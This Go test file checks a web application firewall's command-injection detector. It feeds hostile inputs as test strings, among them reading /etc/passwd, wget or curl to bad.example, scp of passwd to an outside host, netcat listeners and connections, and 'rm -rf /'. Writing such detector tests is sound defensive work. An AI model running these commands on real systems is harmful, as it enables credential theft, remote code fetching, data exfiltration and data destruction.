package cmdi

import (
	"testing"

	"github.com/openloadbalancer/olb/internal/waf/detection"
)

func newCtx(query string) *detection.RequestContext {
	return &detection.RequestContext{
		DecodedQuery: query,
		BodyParams:   make(map[string]string),
		Headers:      make(map[string][]string),
		Cookies:      make(map[string]string),
	}
}

func TestCMDiDetector_ShellMetachars(t *testing.T) {
	d := New()
	attacks := []struct {
		name  string
		input string
	}{
		{"semicolon chain", "; cat /etc/passwd"},
		{"pipe", "| whoami"},
		{"backtick", "`id`"},
		{"subshell", "$(whoami)"},
		{"and chain", "&& ls -la"},
		{"shell path", "/bin/sh -c 'id'"},
	}

	for _, tt := range attacks {
		t.Run(tt.name, func(t *testing.T) {
			ctx := newCtx(tt.input)
			findings := d.Detect(ctx)
			if len(findings) == 0 {
				t.Errorf("expected CMDi detection for %q", tt.input)
			}
		})
	}
}

func TestCMDiDetector_Benign(t *testing.T) {
	d := New()
	benign := []string{
		"search=hello+world",
		"page=1&sort=name",
		"filter=active",
	}

	for _, input := range benign {
		ctx := newCtx(input)
		findings := d.Detect(ctx)
		totalScore := 0
		for _, f := range findings {
			totalScore += f.Score
		}
		if totalScore >= 50 {
			t.Errorf("expected no significant CMDi for benign %q, got score %d", input, totalScore)
		}
	}
}

func TestDetector_Name(t *testing.T) {
	d := New()
	if d.Name() != "cmdi" {
		t.Errorf("expected name 'cmdi', got %q", d.Name())
	}
}

func TestDetect_EmptyInputs(t *testing.T) {
	d := New()
	ctx := &detection.RequestContext{
		DecodedQuery: "",
		BodyParams:   make(map[string]string),
		Headers:      make(map[string][]string),
		Cookies:      make(map[string]string),
	}
	findings := d.Detect(ctx)
	if len(findings) != 0 {
		t.Errorf("expected no findings for empty input, got %d", len(findings))
	}
}

func TestCMDi_OrChain(t *testing.T) {
	d := New()
	// Use a non-dangerous command so or_chain score isn't overridden
	ctx := newCtx("|| somecmd")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected CMDi detection for || chain")
	}
	found := false
	for _, f := range findings {
		if f.Rule == "or_chain" {
			found = true
		}
	}
	if !found {
		t.Error("expected or_chain rule")
	}
}

func TestCMDi_Redirect(t *testing.T) {
	d := New()
	ctx := newCtx("> /tmp/evil.sh")
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "redirect" {
			found = true
		}
	}
	if !found {
		t.Error("expected redirect rule for > /path")
	}
}

func TestCMDi_RedirectWithDot(t *testing.T) {
	d := New()
	ctx := newCtx("> evil.txt")
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "redirect" {
			found = true
		}
	}
	if !found {
		t.Error("expected redirect rule for > file.ext")
	}
}

func TestCMDi_RedirectNoPath(t *testing.T) {
	d := New()
	// Redirect followed by a word without / or . should not trigger
	ctx := newCtx("> justword")
	findings := d.Detect(ctx)
	for _, f := range findings {
		if f.Rule == "redirect" {
			t.Error("did not expect redirect for > without path-like token")
		}
	}
}

func TestCMDi_PipeToDangerousCommand(t *testing.T) {
	d := New()
	ctx := newCtx("| nc 10.0.0.1 4444")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected detection for pipe to nc")
	}
}

func TestCMDi_SemicolonWithKnownCommand(t *testing.T) {
	d := New()
	ctx := newCtx("; wget http://bad.example/shell.sh")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected detection for ; wget")
	}
}

func TestCMDi_DangerousCommandWithMeta(t *testing.T) {
	d := New()
	commands := []string{
		"; cat /etc/passwd",
		"; ls -la",
		"| wget http://bad.example",
		"| curl http://bad.example",
		"; id",
		"; whoami",
		"; uname -a",
		"; hostname",
		"; nc -lvp 4444",
		"; rm -rf /",
		"; chmod 777 /tmp/x",
		"; chown root /tmp/x",
		"; passwd root",
		"; python -c 'import os'",
		"; python3 -c 'import os'",
		"; perl -e 'system(\"id\")'",
		"; ruby -e 'system(\"id\")'",
		"; php -r 'system(\"id\")'",
		"; base64 -d /tmp/x",
		"; xxd /tmp/x",
		"; dd if=/dev/zero",
		"; nslookup bad.example",
		"; dig bad.example",
		"; ping bad.example",
		"; telnet bad.example",
		"; ssh root@bad.example",
		"; scp /etc/passwd bad.example:",
		"; awk '{print}' /etc/passwd",
		"; sed 's/x/y/' /etc/passwd",
		"; xargs rm",
		"; env",
		"; export PATH=/tmp",
		"; printenv",
	}
	for _, input := range commands {
		t.Run(input, func(t *testing.T) {
			ctx := newCtx(input)
			findings := d.Detect(ctx)
			if len(findings) == 0 {
				t.Errorf("expected detection for %q", input)
			}
		})
	}
}

func TestCMDi_ShellPaths(t *testing.T) {
	d := New()
	paths := []string{
		"/bin/sh",
		"/bin/bash",
		"/bin/zsh",
		"/bin/csh",
		"/bin/ksh",
		"/usr/bin/env",
		"/usr/bin/python",
		"/usr/bin/perl",
		"cmd.exe",
		"powershell",
		"powershell.exe",
	}
	for _, path := range paths {
		t.Run(path, func(t *testing.T) {
			ctx := newCtx(path)
			findings := d.Detect(ctx)
			if len(findings) == 0 {
				t.Errorf("expected detection for shell path %q", path)
			}
			found := false
			for _, f := range findings {
				if f.Rule == "shell_path" {
					found = true
				}
			}
			if !found {
				t.Errorf("expected shell_path rule for %q", path)
			}
		})
	}
}

func TestExtractCommand(t *testing.T) {
	tests := []struct {
		input, expected string
	}{
		{" cat /etc/passwd", "cat"},
		{"  whoami", "whoami"},
		{"", ""},
		{"  ", ""},
		{" cmd;next", "cmd"},
		{" cmd|pipe", "cmd"},
		{" cmd&bg", "cmd"},
	}
	for _, tt := range tests {
		got := extractCommand(tt.input)
		if got != tt.expected {
			t.Errorf("extractCommand(%q) = %q, want %q", tt.input, got, tt.expected)
		}
	}
}

func TestContainsWord(t *testing.T) {
	tests := []struct {
		s, word string
		want    bool
	}{
		{"cat /etc/passwd", "cat", true},
		{"scattered", "cat", false},
		{"; cat /etc", "cat", true},
		{"cat", "cat", true},
		{"cat_food", "cat", false},
		{"mycat", "cat", false},
		{"cats", "cat", false},
	}
	for _, tt := range tests {
		got := containsWord(tt.s, tt.word)
		if got != tt.want {
			t.Errorf("containsWord(%q, %q) = %v, want %v", tt.s, tt.word, got, tt.want)
		}
	}
}

func TestContainsWord_NotFound(t *testing.T) {
	got := containsWord("hello world", "xyz")
	if got {
		t.Error("expected false for word not in string")
	}
}

func TestCMDi_PipeCommand(t *testing.T) {
	d := New()
	ctx := newCtx("| cat")
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "pipe_command" {
			found = true
		}
	}
	if !found {
		t.Error("expected pipe_command for single | followed by command")
	}
}

func TestCMDi_BacktickNoClosing(t *testing.T) {
	d := New()
	ctx := newCtx("`unclosed")
	findings := d.Detect(ctx)
	for _, f := range findings {
		if f.Rule == "backtick_exec" {
			t.Error("did not expect backtick_exec without closing backtick")
		}
	}
}

func TestCMDi_SubshellExecution(t *testing.T) {
	d := New()
	ctx := newCtx("$(cat /etc/passwd)")
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "subshell" {
			found = true
		}
	}
	if !found {
		t.Error("expected subshell rule for $()")
	}
}

func TestCMDi_AndChain(t *testing.T) {
	d := New()
	// Use a non-dangerous command so and_chain score isn't overridden
	ctx := newCtx("true && somecmd")
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "and_chain" {
			found = true
		}
	}
	if !found {
		t.Error("expected and_chain rule")
	}
}

func TestCMDi_EmptyAfterSemicolon(t *testing.T) {
	d := New()
	ctx := newCtx(";")
	findings := d.Detect(ctx)
	for _, f := range findings {
		if f.Rule == "semicolon_chain" {
			t.Error("did not expect semicolon_chain for bare ;")
		}
	}
}

func TestCMDi_EmptyAfterPipe(t *testing.T) {
	d := New()
	ctx := newCtx("| ")
	findings := d.Detect(ctx)
	for _, f := range findings {
		if f.Rule == "pipe_command" {
			t.Error("did not expect pipe_command with empty command")
		}
	}
}

func TestCMDi_PipeDoublePipe(t *testing.T) {
	d := New()
	// || should trigger or_chain or dangerous_command (dangerous cmds may score higher)
	ctx := newCtx("false || somecmd")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected detection for || with command")
	}
	foundOrChain := false
	for _, f := range findings {
		if f.Rule == "or_chain" {
			foundOrChain = true
		}
	}
	if !foundOrChain {
		t.Error("expected or_chain for || with command")
	}
}

func TestCMDi_EmptyAfterAndChain(t *testing.T) {
	d := New()
	ctx := newCtx("&& ")
	findings := d.Detect(ctx)
	for _, f := range findings {
		if f.Rule == "and_chain" {
			t.Error("did not expect and_chain with empty command")
		}
	}
}

func TestCMDi_NcatNetcat(t *testing.T) {
	d := New()
	for _, cmd := range []string{"; ncat 10.0.0.1", "; netcat 10.0.0.1"} {
		t.Run(cmd, func(t *testing.T) {
			ctx := newCtx(cmd)
			findings := d.Detect(ctx)
			if len(findings) == 0 {
				t.Errorf("expected detection for %q", cmd)
			}
		})
	}
}

func TestCMDi_ShadowAccess(t *testing.T) {
	d := New()
	ctx := newCtx("; shadow")
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected detection for ; shadow (dangerous command)")
	}
}
